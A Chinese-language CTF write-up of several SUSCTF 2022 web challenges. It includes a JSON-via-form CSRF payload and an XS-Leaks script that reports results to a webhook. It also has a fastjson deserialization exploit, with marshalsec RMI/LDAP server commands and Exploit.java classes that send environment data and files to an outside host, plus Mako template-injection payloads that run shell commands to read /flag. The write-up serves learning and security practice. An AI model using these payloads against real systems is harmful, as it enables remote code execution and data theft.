---
title: SUSCTF 2022 Writeup
catalog: true
date: 2022-03-01 21:54:15
tags: [Security]
categories: [Security]
---

這個假日有不少 CTF，跟著隊伍 SU 一起打了 SUSCTF 2022，這篇簡單記錄一下幾個我有參與的題目的心得。

會講到的題目列表如下：

1. web/fxxkcors
2. web/ez_note
3. web/baby gadget v1.0
4. web/baby gadget v1.0’s rrrevenge
5. web/HTML practice

<!-- more -->

## web/fxxkcors (67 solves)

![](/img/susctf-2022-writeup/p1.png)

這題就是有一個 `change.php` 可以讓你改權限，把自己權限改成 admin 就可以看到 flag 了，request 長得像這樣：

```
POST /changeapi.php HTTP/1.1
Host: 124.71.205.122:10002
Content-Length: 19
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Content-Type: application/json; charset=UTF-8
Origin: http://124.71.205.122:10002
Referer: http://124.71.205.122:10002/change.php
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=1ab6387f551b235d26d1c88a3685d752
Connection: close

{"username":"huli"}
```

但你自己當然沒權限去改，所以這提供了一個 admin bot，你可以給他任意網址讓他去造訪，因此目標顯而易見就是讓 admin bot 幫你 request 去改權限。

可是你是從不同的 origin 發 request 的，而且還要帶上 cookie，所以會在 CORS 那關被擋掉。

這時候就要來 CSRF 了，但是要求的格式是 JSON，該怎麼 CSRF 呢？有一個我以前看到不少次的技巧，如果 server 沒有特別檢查 content type 的話，可以像這樣做：

``` html
<body>
    <form id=a action="http://124.71.205.122:10002/changeapi.php" method="POST" enctype="text/plain">
      <input name='{"username":"huli", "abc":"' value='123"}'>
    </form>
    <script>
      a.submit()
    </script>
</body>
```

因為 POST 其實就是把 request body 變成 `{key}={value}`，所以上面的表單會是 `{"username":"huli", "abc":"`=`123"}`，就產生出了一段 JSON 的資料了。

而這題確實沒有檢查 content type，所以像上面這樣做就好。

## web/ez_note (8 solves)

![](/img/susctf-2022-writeup/p2.png)

這題你可以建立一個帳號之後新增筆記跟搜尋筆記，搜尋的時候如果有找到筆記，會在 client 用 `setTimeout(() => location='/note/12', 1000)` 之類的方式跳轉到筆記頁面。

而這題也有一個 admin bot 會去訪問你提供的頁面，所以很明顯就是 XSLeaks 的題目。

首先我們先來看一下這個 admin bot 的程式碼：

``` js
const visit = async (browser, path) =>{
    let site = process.env.NOTE_SITE ?? ""
    let url = new URL(path, site)
    console.log(`[+]${opt.name}: ${url}`)
    let renderOpt = {...opt}
    try {
        const loginpage = await browser.newPage()
        await loginpage.goto( site+"/signin")
        await loginpage.type("input[name=username]", "admin")
        await loginpage.type("input[name=password]", process.env.NOTE_ADMIN_PASS)
        await Promise.all([
            loginpage.click('button[name=submit]'),
            loginpage.waitForNavigation({waitUntil: 'networkidle0', timeout: 2000})
        ])
        await loginpage.goto("about:blank")
        await loginpage.close()

        const page = await browser.newPage()
        await page.goto(url.href, {waitUntil: 'networkidle0', timeout: 2000})

        await delay(5000) /// waiting 5 second.

    }catch (e) {
        console.log(e)
        renderOpt.message = "error occurred"
        return renderOpt
    }
    renderOpt.message = "admin will view your report soon"
    return renderOpt
}
```

重點是這行：`let url = new URL(path, site)`，乍看之下你會以為你只能提供 site 上的頁面，所以要找到這個題目上的 XSS，但其實不然，仔細看一下[文件](https://nodejs.org/api/url.html#new-urlinput-base)就會知道：

> input: The absolute or relative input URL to parse. If input is relative, then base is required. If input is absolute, the base is ignored

如果你給 absolute URL，base 會被忽略，所以你可以直接提供任意頁面給 admin bot 去訪問。

再來就是找出如何進行 XS leak 了，我最後用的是在 [history.length](https://xsleaks.dev/docs/attacks/navigations/) 這招，原理很簡單，同個 window 底下，就算連去別的網站，你的 `history.length` 也不會清空，意思就是假設我先到 A 網站，再去 B，再導回來 A，存取 `history.length` 時就會是 3。

所以我們可以用 `var win = window.open` 打開筆記搜尋的頁面，接著在一定時間後用 `win.location = '...'` 的方式把這個 window 導回來自己的網站，就可以用 `win.history.length` 存取到這個值，進而得知重新導向的次數，就可以知道筆記搜尋有沒有成功。

我最後拿來 leak 的腳本長這樣：

``` html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="robots" content="noindex">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
</head>

<body>
    <script>
      var flag = 'SUSCTF{'
      function send(msg) {
        fetch('https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b?msg=' + encodeURIComponent(msg))
      }
      function trying(keyword) {
        return new Promise(resolve => {
          var win = window.open('http://123.60.29.171:10001/search?q=' + keyword)
          setTimeout(() => {
            win.location = 'http://e050-220-133-126-220.ngrok.io/non.html'
            setTimeout(() => {
              if (win.history.length === 3) {
                send('success:' + keyword)
              } else {
                //send('fail:' + keyword)
              }
              win.close();
            }, 1000)
          }, 1500)
        })
      }

      async function run() {
        send('start')
        // }abcdefghijklmnopqrstuvwxyz0123456789_
        // }abcdefghijklmnopqrs
        // 
        let chars = '_abcdefghijklmnopqrstuv'.split('')
        //let chars = '}wxyz0123456789_'.split('')
        for(let char of chars) {
          const temp = flag + char
          trying(temp)
        }
      }

      setTimeout(() => {
        run()
      }, 1000)
      
    </script>
</body>
</html>
```

這邊其實有幾個細節，第一個細節是最後有一段：

``` js
setTimeout(() => {
  run()
}, 1000)
```

為什麼還要等一秒之後才開始跑呢？因為 bot 有一段程式碼是：

``` js
await page.goto(url.href, {waitUntil: 'networkidle0', timeout: 2000})
await delay(5000) /// waiting 5 second.
```

會先等到 `networkidle0` 再開始等五秒，我自己試過之後發現如果我沒有先停一秒而是直接開始跑的話，`networkidle0` 似乎就不會觸發，所以就變成跑到 `timeout: 2000`，只有 2 秒的執行時間，跑什麼都會失敗，後來才加這一段。

第二個細節是這一段的秒數：

``` js
setTimeout(() => {
  win.location = 'http://e050-220-133-126-220.ngrok.io/non.html'
  setTimeout(() => {
    if (win.history.length === 3) {
      send('success:' + keyword)
    } else {
      //send('fail:' + keyword)
    }
    win.close();
  }, 1000) // 這裡
}, 1500) // 跟這裡
```

這裡算是人工嘗試幾次之後覺得 ok 的值，因為如果有搜尋到筆記的話是 1 秒後會 redirect，如果早於這個值就導回自己頁面的話會失敗，所以選了 1.5 秒，而導回來自己頁面也需要時間，所以又停了 1 秒。想要更精確的話其實可以用 [Cross-window Timing Attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)，就可以精確很多。

最後一個細節是這一段：`let chars = '_abcdefghijklmnopqrstuv'.split('')`，因為我的腳本跑太慢，如果要 leak 所有字元（38 個）的話會跑不完，所以我必須手動切一半變兩次，提交兩次 URL 才能 leak 出一個字元。

感覺應該會有更快的做法，例如說 5 秒內就把所有字元 leak 出來，有人知道做法的話再麻煩留言指點一下，但總之我當初在做這題時沒想這麼多，就手動一次次提交了，花最久時間在 Google reCAPTCHA，幸好 admin bot 有三個分流，不然驗證到後面圖片直接加上雜訊，人眼也超難看懂...

幸好這題的 flag 不長，好像花了將近 20 分鐘在 submit 網址還有通過驗證，慢慢把字元弄出來。

寫到這邊我突然想到，應該把所有字元不加上 prefix 先跑一遍的，就可以知道 flag 裡有哪些字元，然後字元集可能可以縮小到 10 幾個，就會快三倍...當初怎麼沒想到，下次要記住。

（補充：我看了一下[官方的 writeup](https://github.com/susers/SUSCTF2022_official_wp/blob/main/checkin%20%26%20ez_note%20%26%20rubbish_maker_zh.md)，看起來應該是可以跑一次就把跑所有字元跑完，可能我當初測的時候沒測好，然後官方解答也是 submit 多次，不是 5 秒內就全部抓完）

## web/baby gadget v1.0(14 solves)

![](/img/susctf-2022-writeup/p3.png)

這題有給一個登入頁面，隊友發現用 `/;admin/` 的方式可以繞過，就可以進到後台，後台滿單純的，就是上面截圖這個頁面，有個地方可以下載檔案 `lib.zip`，裡面有用到的套件：

1. commons-lang.jar
2. fastjson-1.2.48.jar
3. flex-messaging-core.jar
4. quartz.jar

然後後台的敘述也很明顯跟 fastjson 有關：

> Fastjson is a Java library that can be used to convert Java Objects into their JSON representation. It can also be used to convert a JSON string to an equivalent Java object. Fastjson can work with arbitrary Java objects including pre-existing objects that you do not have source-code of.

還有給一個 endpoint 可以 POST 資料：

```
POST /admin/mailbox.jsp

inpututext=abcde
```

fastjson 的這個版本有個反序列化漏洞，可以參考這篇：[红队武器库:fastjson小于1.2.68全漏洞RCE利用exp](https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/)。

接著隊友發現了 inpututext 可以放 JSON 字串，server 會用 fastjson 解析，像這樣：`inputtext={"a":123}`，不過我試了這個 payload 沒有看到結果：

``` json
{"abc":{"@type":"java.net.Inet4Address","val":"1486fo.dnslog.cn"}}
```

似乎是 dnslog 有一些問題，之後應該自己架一個或是去找其他類似服務，以備不時之需。不過隊友有用其它服務成功試出來，所以確定是可行的。

接著，就是要照上面那篇去設置好環境，然後想辦法去利用這個漏洞。因為跟 Java 不熟，所以我以前看到 Java 題目基本上都直接放棄，這次也是亂試一波不小心試出來，先感謝一下上面那篇文章的作者，把重現方法寫得滿清楚的，這邊簡單描述一下。

首先，你可以用文中給的 JSON payload 去觸發漏洞：

``` json
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://2.2.2.2:9999/Exploit",
        "autoCommit":true
    }
}
```

這個漏洞會透過 RMI 去載入一個 class 檔案（就是上面的 `dataSourceName`），所以你必須先在你的 server 上面跑一個 RMI server，可以用 [marshalsec-0.0.3-SNAPSHOT-all.jar](https://github.com/mbechler/marshalsec) 這個工具：

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://2.2.2.2:8888/#Exploit" 9999
```

像這個指令就是在 port 9999 跑一個 RMI server，對應到上面的 payload。

再來，你的 RMI server 必須要提供最後你想載入的 Java Class，所以你還要再提供一個地方讓它去下載檔案，也就是上面指令的：`http://2.2.2.2:8888/#Exploit`。

這時候我們可以寫一個 `Exploit.java`：

``` java
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Exploit{
    public Exploit() throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"bash", "-c", "touch /zydx666"});
        InputStream is = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));

        String line;
        while((line = reader.readLine()) != null) {
            System.out.println(line);
        }

        p.waitFor();
        is.close();
        reader.close();
        p.destroy();
    }

    public static void main(String[] args) throws Exception {
    }
}
```

把它編譯一下：`javac Exploit.java`，就產生出了 `Exploit.class`，然後用 Python 簡單起個 server：

```
python3 -m http.server --bind 0.0.0.0 8888
```

你的 RMI server 跟 Python file server 可以在同一個機器比較方便，這時候就一切準備就緒了。（再次強調一下，上面的程式碼都來自 [红队武器库:fastjson小于1.2.68全漏洞RCE利用exp](https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/)這篇好文）

但這題不太一樣，我用上面的方法嘗試了幾次，發現我的 RMI server 有反應，但是 file server 卻沒反應，也就是說有似乎某個環節出了錯，導致整個利用鍊沒有成功，所以當然也沒執行到最後的程式碼。

此時胡亂嘗試了一波，我看到 marshalsec 還有另一個選項是 `marshalsec.jndi.LDAPRefServer`，就改成這個，payload 也換成 ldap 的網址，然後就成功了，我的 file server 就有反應了。

不過可惜的是，看起來執行指令還是沒有成功，因為無論我跑 `nc` 還是 `curl`，我的 server 都沒收到 request。繼續嘗試一波之後，我突然有個想法，會不會其實只是執行指令被封住，但是 Java code 有成功執行？

於是我在 Exploit.java 中加上 `Thread.sleep(5000)`，發現 response 確實慢了五秒，接著我加上：

``` java
URL url = new URL("https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b%22);
InputStream iss = url.openStream();
```

發現 server 收到 request 了！所以 class 確實有被執行，只是不明原因沒辦法直接 `Runtime.getRuntime().exec`。

我的程式碼大概長這樣：

``` java
import java.io.*;
import java.net.*;
import java.util.*;

public class Exploit{
    public Exploit() throws Exception {
        String str = "test";
        URL url = new URL("https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b");
        Map<String,Object> params = new LinkedHashMap<>();
        params.put("msg", str);
        StringBuilder postData = new StringBuilder();
        for (Map.Entry<String,Object> param : params.entrySet()) {
            if (postData.length() != 0) postData.append('&');
            postData.append(URLEncoder.encode(param.getKey(), "UTF-8"));
            postData.append('=');
            postData.append(URLEncoder.encode(String.valueOf(param.getValue()), "UTF-8"));
        }
        byte[] postDataBytes = postData.toString().getBytes("UTF-8");

        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));
        conn.setDoOutput(true);
        conn.getOutputStream().write(postDataBytes);
        Reader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
    }

    public static void main(String[] args) throws Exception {
    }
}
```

後來我嘗試了讀取環境變數送到 server，成功，嘗試讀取 `/` 底下的檔案列表，失敗。因為不知道失敗的原因，所以加了一段 try catch，像這樣：

``` java
String str = "";
try{      
  File f = new File("/var");
  File[] paths = f.listFiles();
  str = paths.toString();
  for (int i = 0; i < paths.length; i++) {
    str += paths[i].toString() + ",";
  }
 
} catch(Exception e){
   str = e.toString() + "," + e.getMessage();
}
```

得到的答案是：`java.lang.reflect.InvocationTargetException`，我現在其實還是不知道為什麼會有這個錯誤，應該是出題者故意把一些東西拿掉了？還是其實是我 Java 的版本問題？

總之呢，因為不能列舉檔案，所以卡了一陣子，還在想說要怎麼辦，接著突然靈光一閃想說那來試試看讀檔好了，不要列舉了，結果就成功了，可以讀到 `/etc/passwd`，接著我想說那來讀看看 `/flag` 好了，結果就讀到了，最後就這樣解掉了。

我只能說，運氣真好。

## web/baby gadget v1.0’s rrrevenge (14 solves)

這題應該是原本的題目有非預期解，所以又更新了一版，但這題我按照上面那樣子，一樣成功拿到 flag，看來我的解法是預期解？

（補充：看了一下[官方 writeup](https://github.com/susers/SUSCTF2022_official_wp/blob/main/baby%20gadget%20v1.0%20and%20rev.pdf)，似乎不是）

## web/HTML practice (11 solves)

![](/img/susctf-2022-writeup/p4.png)

這題就給你一個頁面可以產生 HTML，看起來就一臉 SSTI，但是沒跟你講背後是什麼 template。隊友嘗試了一陣子之後發現有些字元被擋了：`$*_+[]"'/ `，然後如果只放一個 `%` 的話，就會造成 internal server error。

經過另一波亂試之後，我發現 `##` 是註解的意思，因為後面的內容會變不見，此時我用 `template engine ## comment` 去找，有找到一些資料，但還是不確定是不是對的。

於是我對 server 再繼續亂試，送了一些 invalid 的 request，像這樣：`POST generate HTTP/1.1`，就噴了錯誤訊息：

```
HTTP/1.1 400 Bad Request
Content-Length: 133
Content-Type: text/plain

Invalid path in Request-URI: request-target must contain origin-form which starts with absolute-path (URI starting with a slash "/").
```

拿著這段錯誤訊息去 Google，找到了來源：https://github.com/cherrypy/cheroot/blob/master/cheroot/server.py#L900 ，也找到了這一個 Python 框架：[CherryPy](https://docs.cherrypy.dev/en/latest/index.html)，看了一下文件，看到[這段](https://docs.cherrypy.dev/en/latest/advanced.html#id22)：

> CherryPy does not provide any HTML template but its architecture makes it easy to integrate one. Popular ones are Mako or Jinja2.

Mako 有用到 `<% %>`，而且 `##` 是註解，看起來很符合。然後隊友用底下這段迴圈證實了這個猜測：

```
% for a in (1,2,3):
    1
% endfor
```

確定是 Mako 之後，就開始找怎麼用 Mako SSTI，這邊有一大堆：[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako)，但是每一個都要 `<%%>` 或是 `${}`，都是被封起來的字元，此時我覺得上面那個迴圈既然可以用 `%`，那搞不好也可以放其他程式碼，就試了：

```
% for a in (self.module.cache.util.os.system(name),2,3):
  1
% endfor
```

發現是有用的，可以用 query string name 把想執行的程式碼放進去，避開 `'"` 的使用。繼續嘗試一波，發現似乎沒有對外，所以沒辦法把結果傳出來，此時隊友嘗試了寫檔：`echo%20"hello"%20>%20$(pwd)/1`，結果出錯，這時我突然想起來：「對欸，首頁有說檔案會存在 `./templates` 底下」，於是就嘗試了：

```
echo "hello" > ./template/huli.html
```

發現有寫進去，可以用 `http://124.71.178.252/view/huli.html?name=HelloWorld` 讀到檔案，我還在想接下來可以幹嘛的時候，隊友就已經想好然後解掉了：

```
cat /flag > ./template/huli.html
```

拿到 flag 之後要記得再 echo 一次把 flag 蓋掉，避免其他隊伍讀到。

## 總結

另外三題 web 一題比較像是 reverse，要寫 code 去還原混淆過的 PHP，隊友解掉了，另外兩題又是 Java，是考 CommonsCollections 的反序列化，似乎是要找到新的 gadget，也被隊友解掉了，這次 CTF 發現自己在 web 的最大弱點應該就是對 Java 太不熟了，似乎該找個時間看一下，另外對反序列化也沒這麼熟，無論是 Python、PHP 還是 Java，都不太熟，也該研究一下。

最後感謝一下很罩的隊友們，一起順利拿到了 SUSCTF 2022 的第一名 🎉
